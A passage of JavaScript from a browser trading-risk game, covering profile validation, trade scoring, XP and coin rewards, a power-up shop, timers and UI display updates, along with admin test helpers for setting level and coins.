    const errors = [];
    
    // Validate level
    const levelValidation = validateNumericInput(userData.level, 1, 1000);
    if (!levelValidation.valid) {
        errors.push(`Level: ${levelValidation.error}`);
    }
    
    // Validate coins
    const coinsValidation = validateNumericInput(userData.coins, 0, 1000000);
    if (!coinsValidation.valid) {
        errors.push(`Coins: ${coinsValidation.error}`);
    }
    
    return errors;
}

// Data integrity check function
function validateAndRepairUserProfile() {
    const errors = validateUserData(userProfile);
    
    if (errors.length > 0) {
        console.warn('User profile validation errors found:', errors);
        
        // Auto-repair common issues
        userProfile.level = Math.max(1, Math.min(1000, Math.floor(userProfile.level) || 1));
        userProfile.currentXP = Math.max(0, Math.min(100000, Math.floor(userProfile.currentXP) || 0));
        userProfile.totalXP = Math.max(0, Math.min(10000000, Math.floor(userProfile.totalXP) || 0));
        userProfile.coins = Math.max(0, Math.min(1000000, Math.floor(userProfile.coins) || 0));
        userProfile.gamesPlayed = Math.max(0, Math.min(100000, Math.floor(userProfile.gamesPlayed) || 0));
        userProfile.bestScore = Math.max(0, Math.min(10000000, Math.floor(userProfile.bestScore) || 0));
        
        // Ensure arrays are valid
        if (!Array.isArray(userProfile.unlockedAssets)) {
            userProfile.unlockedAssets = ['indices', 'forex', 'commodities'];
        }
        
        // Ensure powerUps object is valid
        if (!userProfile.powerUps || typeof userProfile.powerUps !== 'object') {
            userProfile.powerUps = {
                freezeTimer: 0,
                reduceExposures: 0,
                marketFreeze: 0,
                volatilityShield: 0,
                tradingPlaces: 0,
                hotVols: 0,
                noddingBird: 0
            };
        }
        
        console.log('User profile auto-repaired');
    }
    
    return errors.length === 0;
}

function sellMarket(index) {
    if (isPaused) {
        alert('Cannot trade while game is paused!');
        return;
    }
    
    const market = markets[index];
    const oldAbsExposure = Math.abs(market.exposure);
    const wasBreached = Math.abs(market.exposure) >= market.limit;
        
    market.exposure -= market.limit * 0.25;
    
    const newAbsExposure = Math.abs(market.exposure);
    const isNowBreached = Math.abs(market.exposure) >= market.limit;
    
    addTradeEffect(index);
    
    if (wasBreached && newAbsExposure < oldAbsExposure) {
        score += adminSettings.breachHedgePoints;
        trades++;
        userProfile.totalTrades++;
        awardXP(5);
        awardCoins(adminSettings.coinRewards.breachHedge);
        
        if (!isNowBreached) {
            const timeBonus = individualBreachTimers[index] ? Math.max(1, Math.floor(individualBreachTimers[index] / 2)) : 0;
            score += adminSettings.breachClearBonus + timeBonus;
            userProfile.breachesFixed++;
            sessionBreachesFixed++;
            awardXP(15);
            awardCoins(adminSettings.coinRewards.breachClear);
        }
    } else if (!wasBreached && isNowBreached) {
        score += adminSettings.causeBreachPenalty;
    } else if (!wasBreached && !isNowBreached && newAbsExposure < oldAbsExposure) {
        score += adminSettings.goodTradeBonus;
        trades++;
        userProfile.totalTrades++;
        awardXP(3);
        awardCoins(adminSettings.coinRewards.goodTrade);
    } else if (!wasBreached) {
        score += adminSettings.badTradePenalty;
    } else {
        score += adminSettings.worseBreachPenalty;
    }
    
    updateScore(); // Defined in UI module
    updateDisplay(); // Defined in markets module
}

function addTradeEffect(marketIndex) {
    const row = document.getElementById(`market-${marketIndex}`);
    if (row) {
        row.classList.add('trade-feedback');
        setTimeout(() => {
            row.classList.remove('trade-feedback');
        }, 500);
    }
}

// XP and coin reward system
function awardXP(amount) {
    userProfile.currentXP += amount;
    userProfile.totalXP += amount;
    
    // Allow infinite leveling
    while (userProfile.currentXP >= generateLevelRequirement(userProfile.level)) {
        userProfile.currentXP -= generateLevelRequirement(userProfile.level);
        userProfile.level++;
        showLevelUp(); // Defined in UI module
        awardCoins(adminSettings.coinRewards.levelUpBonus);
        updateCareerDisplay(); // Defined in UI module
    }
    
    updateProfileDisplay(); // Defined in UI module
    updateMenuDisplay(); // Defined in UI module
}

function awardCoins(amount) {
    userProfile.coins += amount;
    // Don't floor the actual stored value, only floor when displaying
    updateProfileDisplay(); // Defined in UI module
    updateMenuDisplay(); // Defined in UI module
}

// Shop system functions
function buyShopItem(item) {
    const availableCoins = Math.floor(userProfile.coins);
    
    if (item === 'shares') {
        if (userProfile.level >= 3 && availableCoins >= 150 && !userProfile.unlockedAssets.includes('shares')) {
            userProfile.coins -= 150;
            userProfile.unlockedAssets.push('shares');
            updateUnlockedAssets(); // Defined in UI module
            updateShopAvailability(); // Defined in UI module
            updateMenuDisplay(); // Defined in UI module
            updateProfileDisplay(); // Defined in UI module
            alert('Shares markets unlocked!');
        }
    } else if (item === 'crypto') {
        if (userProfile.level >= 5 && availableCoins >= 300 && !userProfile.unlockedAssets.includes('crypto')) {
            userProfile.coins -= 300;
            userProfile.unlockedAssets.push('crypto');
            updateUnlockedAssets(); // Defined in UI module
            updateShopAvailability(); // Defined in UI module
            updateMenuDisplay(); // Defined in UI module
            updateProfileDisplay(); // Defined in UI module
            alert('Crypto markets unlocked!');
        }
    } else if (item === 'freezeTimer') {
        if (availableCoins >= 25) {
            userProfile.coins -= 25;
            userProfile.powerUps.freezeTimer++;
            updateShopAvailability(); // Defined in UI module
            updateMenuDisplay(); // Defined in UI module
            updateProfileDisplay(); // Defined in UI module
            showShop(); // Defined in UI module
        }
    } else if (item === 'reduceExposures') {
        if (availableCoins >= 50) {
            userProfile.coins -= 50;
            userProfile.powerUps.reduceExposures++;
            updateShopAvailability(); // Defined in UI module
            updateMenuDisplay(); // Defined in UI module
            updateProfileDisplay(); // Defined in UI module
            showShop(); // Defined in UI module
        }
    } else if (item === 'marketFreeze') {
        if (availableCoins >= 75) {
            userProfile.coins -= 75;
            userProfile.powerUps.marketFreeze++;
            updateShopAvailability(); // Defined in UI module
            updateMenuDisplay(); // Defined in UI module
            updateProfileDisplay(); // Defined in UI module
            showShop(); // Defined in UI module
        }
    } else if (item === 'volatilityShield') {
        if (availableCoins >= 60) {
            userProfile.coins -= 60;
            userProfile.powerUps.volatilityShield++;
            updateShopAvailability(); // Defined in UI module
            updateMenuDisplay(); // Defined in UI module
            updateProfileDisplay(); // Defined in UI module
            showShop(); // Defined in UI module
        }
    } else if (item === 'tradingPlaces') {
        if (availableCoins >= 100) {
            userProfile.coins -= 100;
            userProfile.powerUps.tradingPlaces++;
            updateShopAvailability(); // Defined in UI module
            updateMenuDisplay(); // Defined in UI module
            updateProfileDisplay(); // Defined in UI module
            showShop(); // Defined in UI module
        }
    } else if (item === 'hotVols') {
        if (availableCoins >= 80) {
            userProfile.coins -= 80;
            userProfile.powerUps.hotVols++;
            updateShopAvailability(); // Defined in UI module
            updateMenuDisplay(); // Defined in UI module
            updateProfileDisplay(); // Defined in UI module
            showShop(); // Defined in UI module
        }
    } else if (item === 'noddingBird') {
        if (availableCoins >= 120) {
            userProfile.coins -= 120;
            userProfile.powerUps.noddingBird++;
            updateShopAvailability(); // Defined in UI module
            updateMenuDisplay(); // Defined in UI module
            updateProfileDisplay(); // Defined in UI module
            showShop(); // Defined in UI module
        }
    }
}

// Admin functions for testing
function setPlayerLevel() {
    const newLevel = parseInt(document.getElementById('levelEditor').value);
    if (newLevel >= 1) {
        userProfile.level = newLevel;
        userProfile.currentXP = 0;
        updateProfileDisplay(); // Defined in UI module
        updateMenuDisplay(); // Defined in UI module
        updateUnlockedAssets(); // Defined in UI module
    }
}

function setPlayerCoins() {
    const newCoins = parseInt(document.getElementById('coinsEditor').value);
    if (newCoins >= 0) {
        userProfile.coins = newCoins;
        updateProfileDisplay(); // Defined in UI module
        updateMenuDisplay(); // Defined in UI module
    }
}

function unlockAllAssets() {
    userProfile.unlockedAssets = ['indices', 'forex', 'shares', 'commodities', 'crypto'];
    updateUnlockedAssets(); // Defined in UI module
    updateMenuDisplay(); // Defined in UI module
    alert('All asset classes unlocked!');
}

function resetProgress() {
    userProfile = {
        username: userProfile.username,
        title: 'Novice',
        level: 1,
        currentXP: 0,
        totalXP: 0,
        gamesPlayed: 0,
        bestScore: 0,
        totalTrades: 0,
        breachesFixed: 0,
        wins: 0,
        coins: 0,
        unlockedAssets: ['indices', 'forex', 'commodities'],
        powerUps: {
             freezeTimer: 0,
             reduceExposures: 0,
             marketFreeze: 0,
             volatilityShield: 0,
             tradingPlaces: 0,
             hotVols: 0,
             noddingBird: 0
        }
    };
    updateProfileDisplay(); // Defined in UI module
    updateMenuDisplay(); // Defined in UI module
    updateUnlockedAssets(); // Defined in UI module
    updatePowerupsDisplay(); // Defined in powerups module
    document.getElementById('levelEditor').value = userProfile.level;
    document.getElementById('coinsEditor').value = userProfile.coins;
    alert('Progress reset to default state');
}

// Export to global scope
window.buyMarket = buyMarket;
window.sellMarket = sellMarket;
window.addTradeEffect = addTradeEffect;
window.awardXP = awardXP;
window.awardCoins = awardCoins;
window.buyShopItem = buyShopItem;
window.setPlayerLevel = setPlayerLevel;
window.setPlayerCoins = setPlayerCoins;
window.unlockAllAssets = unlockAllAssets;
window.resetProgress = resetProgress;
window.validateUserData = validateUserData;
window.validateNumericInput = validateNumericInput;
window.validateAndRepairUserProfile = validateAndRepairUserProfile;



// ===== POWERUPS_MODULE MODULE =====
// ===== POWER-UPS SYSTEM MODULE =====
// Dependencies: config.js (activePowerups, adminSettings, marketData, userProfile), gameState.js (currentView, isPaused)
// Exposes: Power-up activation, timer management, display updates

// Power-up activation function
function usePowerup(powerupType) {
    if (isPaused) {
        alert('Cannot use power-ups while game is paused!');
        return;
    }
    
    const powerup = activePowerups[powerupType];
        
    if (userProfile.powerUps[powerupType] <= 0) {
        alert('You don\'t have any of this power-up! Visit the shop to buy more.');
        return;
    }
    
    if (powerup.cooldown > 0) {
        alert(`Power-up is on cooldown for ${powerup.cooldown} more seconds!`);
        return;
    }
    
    userProfile.powerUps[powerupType]--;
    
    switch(powerupType) {
        case 'marketFreeze':
            powerup.active = true;
            powerup.timeLeft = 10;
            powerup.cooldown = 20;
            break;
            
        case 'volatilityShield':
            powerup.active = true;
            powerup.timeLeft = 15;
            powerup.cooldown = 25;
            break;
            
        case 'freezeTimer':
            powerup.active = true;
            powerup.timeLeft = 5;
            powerup.cooldown = 15;
            break;
            
        case 'reduceExposures':
            Object.keys(marketData).forEach(assetClass => {
                marketData[assetClass].forEach(market => {
                    market.exposure *= 0.75;
                });
            });
            markets = marketData[currentAssetClass];
            powerup.cooldown = 30;
            awardXP(10); // Defined in trading module
            break;
            
        case 'tradingPlaces':
            powerup.active = true;
            powerup.timeLeft = 60;
            powerup.cooldown = 90;
            break;
            
        case 'hotVols':
            powerup.active = true;
            powerup.timeLeft = 30;
            powerup.cooldown = 45;
            // Store original volatility to restore later
            if (!window.originalGlobalVolatility) {
                window.originalGlobalVolatility = adminSettings.globalVolatilityMultiplier;
            }
            adminSettings.globalVolatilityMultiplier *= 2;
            updateGlobalVolatilityDisplay(); // Defined in UI module
            break;
            
        case 'noddingBird':
            powerup.active = true;
            powerup.timeLeft = 30;
            powerup.cooldown = 60;
            awardXP(5); // Defined in trading module
            break;    
    }
    
    updatePowerupsDisplay();
    updateDisplay(); // Defined in markets module
    updateProfileDisplay(); // Defined in UI module
}

// Power-up timer management
function updatePowerupTimers() {
    if (isPaused) return;
    
    Object.keys(activePowerups).forEach(powerupType => {
        const powerup = activePowerups[powerupType];
        
        // Handle Hot Vols expiration
        if (powerupType === 'hotVols' && powerup.active && powerup.timeLeft === 1) {
            // Restore original volatility when Hot Vols expires
            if (window.originalGlobalVolatility) {
                adminSettings.globalVolatilityMultiplier = window.originalGlobalVolatility;
                updateGlobalVolatilityDisplay(); // Defined in UI module
                delete window.originalGlobalVolatility;
            }
        }
        
        if (powerup.timeLeft > 0) {
            powerup.timeLeft--;
            if (powerup.timeLeft <= 0) {
                powerup.active = false;
            }
        }
        
        if (powerup.cooldown > 0) {
            powerup.cooldown--;
        }
    });
    
    if (currentView === 'powerups') {
        updatePowerupsDisplay();
    }
    updateGlobalEffectsBar();
    populateQuickPowerupBar(); // Refresh the quick access bar to update cooldown timers
}

// Power-up display functions
function switchToPowerups() {
    currentView = 'powerups';
    
    document.querySelectorAll('.tab-button').forEach(tab => {
        tab.classList.remove('active');
    });
    document.querySelector('.tab-button.powerups').classList.add('active');
    
    document.getElementById('marketsContainer').style.display = 'none';
    document.getElementById('powerupsContainer').style.display = 'block';
    
    updatePowerupsDisplay();
}

function updatePowerupsDisplay() {
    safeUpdateElement('freezeCount', userProfile.powerUps.marketFreeze); // Defined in UI module
    safeUpdateElement('shieldCount', userProfile.powerUps.volatilityShield); // Defined in UI module
    safeUpdateElement('oldFreezeCount', userProfile.powerUps.freezeTimer); // Defined in UI module
    safeUpdateElement('reduceAllCount', userProfile.powerUps.reduceExposures); // Defined in UI module
    safeUpdateElement('tradingPlacesCount', userProfile.powerUps.tradingPlaces); // Defined in UI module
    safeUpdateElement('hotVolsCount', userProfile.powerUps.hotVols); // Defined in UI module
    safeUpdateElement('noddingBirdCount', userProfile.powerUps.noddingBird); // Defined in UI module
        
    Object.keys(activePowerups).forEach(powerupType => {
        const powerup = activePowerups[powerupType];
        const button = document.getElementById(getButtonId(powerupType));
        const cooldownDiv = document.getElementById(getCooldownId(powerupType));
        const statusDiv = document.getElementById(getStatusId(powerupType));
        const card = document.getElementById(getCardId(powerupType));
        
        if (button) {
            button.disabled = userProfile.powerUps[powerupType] <= 0 || powerup.cooldown > 0;
            
            if (powerup.active && powerup.timeLeft > 0) {
                button.textContent = `ACTIVE (${powerup.timeLeft}s)`;
                card.classList.add('active');
            } else {
                button.textContent = getButtonText(powerupType);
                card.classList.remove('active');
            }
        }
        
        if (cooldownDiv) {
            if (powerup.cooldown > 0) {
                cooldownDiv.style.display = 'block';
                document.getElementById(getTimerId(powerupType)).textContent = powerup.cooldown;
            } else {
                cooldownDiv.style.display = 'none';
            }
        }
        
        if (statusDiv) {
            if (powerup.active && powerup.timeLeft > 0) {
                statusDiv.textContent = `Active for ${powerup.timeLeft} seconds`;
                statusDiv.style.color = '#4CAF50';
            } else if (powerup.cooldown > 0) {
                statusDiv.textContent = `Cooldown: ${powerup.cooldown}s`;
                statusDiv.style.color = '#ff9800';
            } else if (userProfile.powerUps[powerupType] <= 0) {
                statusDiv.textContent = 'Out of stock - buy more in shop';
                statusDiv.style.color = '#f44336';
            } else {
                statusDiv.textContent = 'Ready to use';
                statusDiv.style.color = '#888';
            }
        }
    });
    
    updateGlobalEffectsBar();
}

function updateGlobalEffectsBar() {
    const effectsDiv = document.getElementById('activeEffects');
    const activeEffectsList = [];
    
    Object.keys(activePowerups).forEach(powerupType => {
        const powerup = activePowerups[powerupType];
        if (powerup.active && powerup.timeLeft > 0) {
            const iconMap = {
                marketFreeze: '',
                volatilityShield: '', 
                freezeTimer: '',
                reduceExposures: '',
                tradingPlaces: '',
                hotVols: '',
                noddingBird: ''
            };
            
            activeEffectsList.push(`
                <div class="active-effect">
                    <span class="effect-icon">${iconMap[powerupType]}</span>
                    <span class="effect-timer">${powerup.timeLeft}s</span>
                </div>
            `);
        }
    });
    
    if (effectsDiv) {
        effectsDiv.innerHTML = activeEffectsList.join('');
    }
    
    updatePowerupScrollButtons();
}

// Admin function for giving all powerups
function giveAllPowerups() {
    userProfile.powerUps.freezeTimer += 5;
    userProfile.powerUps.reduceExposures += 5;
    userProfile.powerUps.marketFreeze += 5;
    userProfile.powerUps.volatilityShield += 5;
    userProfile.powerUps.tradingPlaces += 5;
    userProfile.powerUps.hotVols += 5;
    userProfile.powerUps.noddingBird += 5;
    updatePowerupsDisplay();
    updateMenuDisplay(); // Defined in UI module
    alert('All power-ups granted! (5 each)');
}

// Power-up ID mapping functions
function getButtonId(powerupType) {
    const mapping = {
        marketFreeze: 'freezeButton',
        volatilityShield: 'shieldButton',
        freezeTimer: 'oldFreezeButton',
        reduceExposures: 'reduceButton',
        tradingPlaces: 'tradingPlacesButton',
        hotVols: 'hotVolsButton',
        noddingBird: 'noddingBirdButton'
    };
    return mapping[powerupType];
}

function getCooldownId(powerupType) {
    const mapping = {
        marketFreeze: 'freezeCooldown',
        volatilityShield: 'shieldCooldown',
        freezeTimer: 'oldFreezeCooldown',
        reduceExposures: 'reduceCooldown',
        tradingPlaces: 'tradingPlacesCooldown',
        hotVols: 'hotVolsCooldown',
        noddingBird: 'noddingBirdCooldown'
    };
    return mapping[powerupType];
}

function getStatusId(powerupType) {
    const mapping = {
        marketFreeze: 'freezeStatus',
        volatilityShield: 'shieldStatus',
        freezeTimer: 'oldFreezeStatus',
        reduceExposures: 'reduceStatus',
        tradingPlaces: 'tradingPlacesStatus',
        hotVols: 'hotVolsStatus',
        noddingBird: 'noddingBirdStatus'
    };
    return mapping[powerupType];
}

function getCardId(powerupType) {
    const mapping = {
        marketFreeze: 'freezeCard',
        volatilityShield: 'shieldCard',
        freezeTimer: 'oldFreezeCard',
        reduceExposures: 'reduceCard',
        tradingPlaces: 'tradingPlacesCard',
        hotVols: 'hotVolsCard',
        noddingBird: 'noddingBirdCard'
    };
    return mapping[powerupType];
}

function getTimerId(powerupType) {
    const mapping = {
        marketFreeze: 'freezeTimer',
        volatilityShield: 'shieldTimer',
        freezeTimer: 'oldFreezeTimer',
        reduceExposures: 'reduceTimer',
        tradingPlaces: 'tradingPlacesTimer',
        hotVols: 'hotVolsTimer',
        noddingBird: 'noddingBirdTimer'
    };
    return mapping[powerupType];
}

function getButtonText(powerupType) {
    const mapping = {
        marketFreeze: 'ACTIVATE FREEZE',
        volatilityShield: 'ACTIVATE SHIELD',
        freezeTimer: 'STOP TIMERS',
        reduceExposures: 'REDUCE EXPOSURES',
        tradingPlaces: 'TURN THOSE MACHINES BACK ON!',
        hotVols: 'ACTIVATE HOT VOLS',
        noddingBird: 'ACTIVATE NODDING BIRD'
    };
    return mapping[powerupType];
}

// Quick access powerup bar management
let powerupScrollOffset = 0;
let maxPowerupScrollOffset = 0;

function populateQuickPowerupBar() {
    const container = document.getElementById('powerupIcons');
    if (!container) {
        console.warn('Powerup container not found, retrying...');
        setTimeout(() => populateQuickPowerupBar(), 100);
        return;
    }
    
    // Sort powerups: owned first, then unowned
    const powerupList = [
        { type: 'marketFreeze', icon: '', name: 'Market Freeze' },
        { type: 'volatilityShield', icon: '', name: 'Volatility Shield' },
        { type: 'freezeTimer', icon: '', name: 'Freeze Timer' },
        { type: 'reduceExposures', icon: '', name: 'Reduce All' },
        { type: 'tradingPlaces', icon: '', name: 'Trading Places' },
        { type: 'hotVols', icon: '', name: 'Hot Vols' },
        { type: 'noddingBird', icon: '', name: 'Nodding Bird' }
    ];
    
    const owned = powerupList.filter(p => userProfile.powerUps[p.type] > 0);
    const unowned = powerupList.filter(p => userProfile.powerUps[p.type] === 0);
    const sortedPowerups = [...owned, ...unowned];
    
    container.innerHTML = sortedPowerups.map(powerup => {
        const count = userProfile.powerUps[powerup.type];
        const isDisabled = count === 0;
        const cooldown = activePowerups[powerup.type].cooldown;
        const cooldownBadge = cooldown > 0 ? `<span class="powerup-cooldown-indicator">${cooldown}</span>` : '';
        
        return `
            <div class="powerup-icon-quick ${isDisabled ? 'disabled' : ''}" 
                 onclick="${isDisabled || cooldown > 0 ? '' : `usePowerup('${powerup.type}')`}"
                 title="${powerup.name}">
                ${powerup.icon}
                <span class="powerup-count-quick">${count}</span>
                ${cooldownBadge}
            </div>
        `;
    }).join('');
    
    updatePowerupScrollButtons();
}

function updatePowerupScrollButtons() {
    const effectsSection = document.getElementById('effectsSection');
    
    // Check if any effects are active
    const hasActiveEffects = Object.keys(activePowerups).some(type => activePowerups[type].active);
    
    if (hasActiveEffects) {
        effectsSection.classList.remove('hidden');
    } else {
        effectsSection.classList.add('hidden');
    }
    
    // Don't call populateQuickPowerupBar() here to avoid infinite loop
}

// Export new functions
window.populateQuickPowerupBar = populateQuickPowerupBar;
window.updatePowerupScrollButtons = updatePowerupScrollButtons;


// Export to global scope
window.usePowerup = usePowerup;
window.updatePowerupTimers = updatePowerupTimers;
window.switchToPowerups = switchToPowerups;
window.updatePowerupsDisplay = updatePowerupsDisplay;
window.updateGlobalEffectsBar = updateGlobalEffectsBar;
window.giveAllPowerups = giveAllPowerups;
window.getButtonId = getButtonId;
window.getCooldownId = getCooldownId;
window.getStatusId = getStatusId;
window.getCardId = getCardId;
window.getTimerId = getTimerId;
window.getButtonText = getButtonText;

// ===== UI_MODULE MODULE =====
// ===== UI MANAGEMENT MODULE =====
// Dependencies: config.js (userProfile, gameEndSettings, adminSettings), gameState.js (score, trades, etc.)
// Exposes: Screen transitions, display updates, modal management, safe DOM updates

// Enhanced DOM safety utilities
function waitForElement(selector, timeout = 5000) {
    return new Promise((resolve, reject) => {
        const element = document.querySelector(selector);
        if (element) {
            resolve(element);
            return;
        }
        
        const observer = new MutationObserver((mutations, obs) => {
            const element = document.querySelector(selector);
            if (element) {
                obs.disconnect();
                resolve(element);
            }
        });
        
        observer.observe(document.body, {
            childList: true,
            subtree: true
        });
        
        setTimeout(() => {
            observer.disconnect();
            reject(new Error(`Element ${selector} not found within ${timeout}ms`));
        }, timeout);
    });
}

function safeElementOperation(selector, operation, fallback = null) {
    try {
        const element = document.querySelector(selector);
        if (element) {
            return operation(element);
        } else {
            console.warn(`Element not found: ${selector}`);
            return fallback;
        }
    } catch (error) {
        console.error(`Error in DOM operation for ${selector}:`, error);
        return fallback;
    }
}

// Screen transition functions
function showAuthScreen() {
    safeElementOperation('#authScreen', el => el.style.display = 'flex');
    safeElementOperation('#menuScreen', el => el.style.display = 'none');
    safeElementOperation('#gameScreen', el => el.style.display = 'none');
}

function showMenu() {
    safeElementOperation('#authScreen', el => el.style.display = 'none');
    safeElementOperation('#menuScreen', el => el.style.display = 'flex');
    safeElementOperation('#gameScreen', el => el.style.display = 'none');
    
    const logoutBtn = document.getElementById('logoutBtn');
    const createAccountBtn = document.getElementById('createAccountBtn');
    
    if (logoutBtn) {
        logoutBtn.style.display = currentUser && !isGuestMode ? 'flex' : 'none';
    }
    
    if (createAccountBtn) {
        createAccountBtn.style.display = isGuestMode ? 'flex' : 'none';
    }
    
    // Initialize game systems if not already done
    initializeEverything(); // Defined in gameState module
    updateMenuDisplay();

    // Ensure default difficulty shows
    ensureDefaultDifficulty(); // Defined in gameState module
}

// Safe DOM update functions
function safeUpdateElement(id, content, property = 'textContent') {
    return safeElementOperation(`#${id}`, el => {
        el[property] = content;
        return true;
    }, false);
}

function safeUpdateStyle(id, property, value) {
    return safeElementOperation(`#${id}`, el => {
        if (el.style) {
            el.style[property] = value;
            return true;
        }
        return false;
    }, false);
}

function safeAddClass(id, className) {
    return safeElementOperation(`#${id}`, el => {
        el.classList.add(className);
        return true;
    }, false);
}

function safeRemoveClass(id, className) {
    return safeElementOperation(`#${id}`, el => {
        el.classList.remove(className);
        return true;
    }, false);
}

// Profile display functions
function updateProfileDisplay() {
    safeUpdateElement('usernameDisplay', userProfile.username);
    safeUpdateElement('levelBadge', `Level ${userProfile.level}`);
    safeUpdateElement('coinsDisplay', `${Math.floor(userProfile.coins)} `);
    populateQuickPowerupBar(); // Update quick access powerup bar
    
    const currentLevelReq = generateLevelRequirement(userProfile.level); // Defined in config module
    const xpPercent = (userProfile.currentXP / currentLevelReq) * 100;
    
    safeUpdateStyle('xpBar', 'width', `${xpPercent}%`);
    safeUpdateElement('xpText', `${userProfile.currentXP} / ${currentLevelReq} XP`);
}

function updateMenuDisplay() {
    safeUpdateElement('menuUsername', userProfile.username);
    safeUpdateElement('menuLevelCircle', `L${userProfile.level}`);
    safeUpdateElement('menuCoins', Math.floor(userProfile.coins));
    safeUpdateElement('menuAssets', userProfile.unlockedAssets.length);
    populateQuickPowerupBar(); // Update quick access powerup bar
    
    const currentLevelReq = generateLevelRequirement(userProfile.level); // Defined in config module
    const xpPercent = (userProfile.currentXP / currentLevelReq) * 100;
    
    safeUpdateStyle('menuXpBar', 'width', `${xpPercent}%`);
    safeUpdateElement('menuXpText', `${userProfile.currentXP} / ${currentLevelReq} XP`);
    safeUpdateElement('menuGamesPlayed', userProfile.gamesPlayed);
    safeUpdateElement('menuBestScore', userProfile.bestScore);
}

// Game score display
function updateScore() {
    safeUpdateElement('score', score);
    safeUpdateElement('trades', trades);
    safeUpdateElement('breaches', breaches);
    safeUpdateElement('time', gameTime);
    safeUpdateElement('difficulty', ['Easy', 'Normal', 'Hard'][gameDifficulty - 1]);
}

// Strikes display (lives remaining)
function updateStrikesDisplay() {
    const strikesLeft = gameEndSettings.maxMissedTimers - missedTimers;
    
    for (let i = 1; i <= 3; i++) {
        safeElementOperation(`#strike${i}`, strikeIcon => {
            if (i <= strikesLeft) {
                strikeIcon.className = 'strike-icon active';
                if (strikesLeft === 1) {
                    strikeIcon.classList.add('warning');
                }
            } else {
                strikeIcon.className = 'strike-icon lost';
            }
        });
    }
}

// Asset unlock display
function updateUnlockedAssets() {
    const sharesLock = document.getElementById('sharesLock');
    const cryptoLock = document.getElementById('cryptoLock');
    
    if (sharesLock) {
        sharesLock.style.display = userProfile.unlockedAssets.includes('shares') ? 'none' : 'block';
    }
    if (cryptoLock) {
        cryptoLock.style.display = userProfile.unlockedAssets.includes('crypto') ? 'none' : 'block';
    }
}

// Level up notification
function showLevelUp() {
    const notification = document.createElement('div');
    notification.style.cssText = `
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        background: linear-gradient(145deg, #ff9800, #f57c00);
        color: white;
        padding: 20px 30px;
        border-radius: 10px;
        font-weight: bold;
        font-size: 18px;
        z-index: 2000;
        border: 2px solid rgba(255,255,255,0.3);
        box-shadow: 0 10px 30px rgba(0,0,0,0.5);
    `;
    notification.textContent = `LEVEL UP! You are now Level ${userProfile.level}!`;
    document.body.appendChild(notification);
    
    setTimeout(() => {
        try {
            if (notification.parentNode) {
                notification.parentNode.removeChild(notification);
            }
        } catch (e) {
            // Silently handle case where element was already removed
        }
    }, 2000);
}

// Pause menu functions
function showPauseMenu() {
    isPaused = true;
    
    // Update pause menu with current stats
    safeUpdateElement('pauseScore', score);
    safeUpdateElement('pauseTime', `${gameTime}s`);
    
    // Update pause button state
    safeElementOperation('#pauseBtn', btn => {
        btn.textContent = 'Resume';
        btn.className = 'control-btn paused';
    });
    
    // Show pause menu
    safeUpdateStyle('pauseMenuModal', 'display', 'flex');
}

// Game over modal
function showGameOverModal(message, xpEarned, coinsEarned, leveledUp, newBest) {
    
    const modal = document.getElementById('gameOverModal');
    
    if (!modal) {
        console.error("gameOverModal element not found!");
        alert(message);
        return;
    }
       
    // Safely update modal content with null checks
    const elements = {
        'gameOverMessage': message,
        'finalScore': score,
        'survivalTime': formatTime(gameTime), // Defined in gameState module
        'totalTradesMade': trades,
        'breachesHandled': sessionBreachesFixed,
        'sessionXP': `+${xpEarned} XP`,
        'sessionCoins': `+${coinsEarned}`
    };
    
    Object.keys(elements).forEach(id => {
        safeUpdateElement(id, elements[id]);
    });
    
    // Show level up indicator if applicable
    safeUpdateStyle('levelUpIndicator', 'display', leveledUp ? 'flex' : 'none');
    
    // Show new best score indicator if applicable
    safeUpdateStyle('newBestScore', 'display', newBest ? 'flex' : 'none');
    
    // Force display the modal
    modal.style.display = 'flex';
    modal.style.position = 'fixed';
    modal.style.top = '0';
    modal.style.left = '0';
    modal.style.width = '100%';
    modal.style.height = '100%';
    modal.style.zIndex = '9999';
}

function closeGameOver() {
    safeUpdateStyle('gameOverModal', 'display', 'none');
    returnToMenu(); // Defined in gameState module
}

function playAgain() {
    safeUpdateStyle('gameOverModal', 'display', 'none');
    resetGameState(); // Defined in gameState module
    startGame(); // Defined in gameState module
}

// Instructions modal
function showInstructions() {
    safeUpdateStyle('instructionsModal', 'display', 'flex');
}

function closeInstructions() {
    safeUpdateStyle('instructionsModal', 'display', 'none');
}

// Shop modal and functions
function showShop() {
    safeUpdateElement('shopCoins', Math.floor(userProfile.coins));
    safeUpdateElement('freezeTimerShopCount', userProfile.powerUps.freezeTimer);
    safeUpdateElement('reduceExposuresShopCount', userProfile.powerUps.reduceExposures);
    safeUpdateElement('marketFreezeShopCount', userProfile.powerUps.marketFreeze);
    safeUpdateElement('volatilityShieldShopCount', userProfile.powerUps.volatilityShield);
    safeUpdateElement('tradingPlacesShopCount', userProfile.powerUps.tradingPlaces);
    safeUpdateElement('hotVolsShopCount', userProfile.powerUps.hotVols);
    safeUpdateElement('noddingBirdShopCount', userProfile.powerUps.noddingBird);
    updateShopAvailability();
    safeUpdateStyle('shopModal', 'display', 'flex');
}

function closeShop() {
    safeUpdateStyle('shopModal', 'display', 'none');
}

function updateShopAvailability() {
    const availableCoins = Math.floor(userProfile.coins);
    
    safeElementOperation('#buyShares', sharesBtn => {
        if (userProfile.unlockedAssets.includes('shares')) {
            sharesBtn.textContent = 'Owned ';
            sharesBtn.style.background = '#4CAF50';
            sharesBtn.disabled = true;
        } else if (userProfile.level < 3) {
            sharesBtn.textContent = 'Level 3';
            sharesBtn.style.background = '#666';
            sharesBtn.disabled = true;
        } else if (availableCoins < 150) {
            sharesBtn.textContent = '150 ';
            sharesBtn.style.background = '#666';
            sharesBtn.disabled = true;
        } else {
            sharesBtn.textContent = '150 ';
            sharesBtn.style.background = '#ffd700';
            sharesBtn.disabled = false;
        }
    });
    
    safeElementOperation('#buyCrypto', cryptoBtn => {
        if (userProfile.unlockedAssets.includes('crypto')) {
            cryptoBtn.textContent = 'Owned ';
            cryptoBtn.style.background = '#4CAF50';
            cryptoBtn.disabled = true;
        } else if (userProfile.level < 5) {
            cryptoBtn.textContent = 'Level 5';
            cryptoBtn.style.background = '#666';
            cryptoBtn.disabled = true;
        } else if (availableCoins < 300) {
            cryptoBtn.textContent = '300 ';
            cryptoBtn.style.background = '#666';
            cryptoBtn.disabled = true;
        } else {
            cryptoBtn.textContent = '300 ';
            cryptoBtn.style.background = '#ffd700';
            cryptoBtn.disabled = false;
        }
    });
}

// Admin panel display functions
function updateGlobalVolatilityDisplay() {
    safeElementOperation('#currentGlobalVolatility', element => {
